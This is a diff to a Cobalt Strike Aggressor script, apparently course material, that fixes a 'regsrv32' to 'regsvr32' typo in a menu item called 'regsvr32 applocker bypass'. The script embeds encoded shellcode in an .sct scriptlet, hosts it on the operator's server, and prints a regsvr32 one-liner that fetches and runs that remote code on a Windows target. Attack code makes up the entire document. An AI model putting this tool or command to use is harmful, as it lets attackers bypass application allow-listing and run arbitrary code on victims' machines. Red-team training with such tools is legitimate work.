@@ -3,7 +3,7 @@ sub create_sct {
 	$shellcode = $1;
 	$shellcode_length = $2;
 
-	$handle = openf("/opt/cobaltstrike-course/scripts/regsrv32.sct");
+	$handle = openf("/opt/cobaltstrike-course/scripts/regsvr32.sct");
 	$sct = readb($handle, -1);
 	closef($handle);
 	
@@ -45,20 +45,20 @@ sub setup_attack {
 	$payload = encode_shellcode($shellcode);
 	$template = create_sct($payload, $shellcode_length);
 
-	$url = site_host(%options["host"], %options["port"], %options["uri"], $template, "text/plain", "regsrv32 /u /n /s /i:<url> scrobj.dll"); 
+	$url = site_host(%options["host"], %options["port"], %options["uri"], $template, "text/plain", "regsvr32 /u /n /s /i:<url> scrobj.dll"); 
 	$command = "regsvr32 /u /n /s /i:" . $url . " scrobj.dll";
 	prompt_text("One-liner: ", $command, {});
 }
 
 popup attacks {
-	item "regsrv32 applocker bypass" {
+	item "regsvr32 applocker bypass" {
 		local('$dialog %defaults');
 
 		%defaults["uri"]  = "/bananas.html";
 		%defaults["host"] = localip();
 		%defaults["port"] = 80;
 
-		$dialog = dialog("regsrv32 applocker bypass", %defaults, &setup_attack);
+		$dialog = dialog("regsvr32 applocker bypass", %defaults, &setup_attack);
 		dialog_description($dialog, "regsvr32");
 		drow_file($dialog, "file", "File:");
 		drow_text($dialog, "uri", "URI Path:");
